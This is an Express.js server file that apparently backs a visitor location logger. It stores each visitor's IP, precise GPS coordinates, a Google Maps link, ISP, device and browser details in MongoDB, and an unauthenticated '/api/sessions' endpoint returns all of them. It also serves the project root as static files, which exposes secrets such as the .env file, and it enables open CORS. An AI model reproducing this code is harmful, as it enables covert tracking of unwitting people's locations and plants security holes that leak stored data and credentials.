require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { connectDB } = require('./lib/mongodb');
const Session = require('./models/Session');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

// Static asset fallbacks
app.get('/style.css', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

app.get('/app.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'app.js'));
});

// Connect to MongoDB
connectDB().catch(err => console.error('MongoDB init error:', err));

// API Route: Save session data
app.post('/api/save-session', async (req, res) => {
  try {
    await connectDB();
    const {
      sessionId,
      ip,
      ipType,
      latitude,
      longitude,
      accuracy,
      locationSource,
      mapsUrl,
      ipLatitude,
      ipLongitude,
      address,
      country,
      city,
      isp,
      asn,
      timezone,
      os,
      browser,
      screenResolution,
      language,
      userAgent,
      sessionTime
    } = req.body || {};

    const headerIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.headers['x-real-ip'] || req.socket?.remoteAddress;
    const finalIp = ip || headerIp || 'Unknown';

    const lat = latitude != null && !isNaN(Number(latitude)) ? Number(latitude) : null;
    const lng = longitude != null && !isNaN(Number(longitude)) ? Number(longitude) : null;
    const computedMapsUrl = mapsUrl || (lat != null && lng != null ? `https://www.google.com/maps?q=${lat},${lng}` : null);

    const dataToSave = {
      ip: finalIp,
      ipType: ipType || (finalIp.includes(':') ? 'IPv6' : 'IPv4'),
      latitude: lat,
      longitude: lng,
      accuracy: accuracy != null && !isNaN(Number(accuracy)) ? Number(accuracy) : null,
      locationSource: locationSource || 'ip',
      mapsUrl: computedMapsUrl,
      ipLatitude: ipLatitude != null && !isNaN(Number(ipLatitude)) ? Number(ipLatitude) : null,
      ipLongitude: ipLongitude != null && !isNaN(Number(ipLongitude)) ? Number(ipLongitude) : null,
      address: address || null,
      country,
      city,
      isp,
      asn,
      timezone,
      os,
      browser,
      screenResolution,
      language,
      userAgent,
      sessionTime
    };

    let savedDoc;
    let isUpdate = false;

    if (sessionId) {
      savedDoc = await Session.findByIdAndUpdate(sessionId, dataToSave, { new: true });
      if (savedDoc) isUpdate = true;
    }

    if (!savedDoc) {
      const newSession = new Session(dataToSave);
      savedDoc = await newSession.save();
    }

    console.log(`[${isUpdate ? 'UPDATED' : 'SAVED'}] Session for IP: ${ip} | Location: (${lat}, ${lng}) [Source: ${locationSource}] (ID: ${savedDoc._id})`);

    return res.status(200).json({
      success: true,
      message: isUpdate ? 'Session updated in MongoDB' : 'Session saved to MongoDB',
      id: savedDoc._id,
      savedAt: savedDoc.savedAt,
      isUpdate
    });
  } catch (error) {
    console.error('Error saving session:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
});

// API Route: Retrieve latest saved sessions
app.get('/api/sessions', async (req, res) => {
  try {
    await connectDB();
    const limit = Math.min(parseInt(req.query.limit) || 20, 100);
    const sessions = await Session.find().sort({ createdAt: -1 }).limit(limit);
    return res.json({ success: true, count: sessions.length, data: sessions });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start local server if run directly
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
  });
}

module.exports = app;
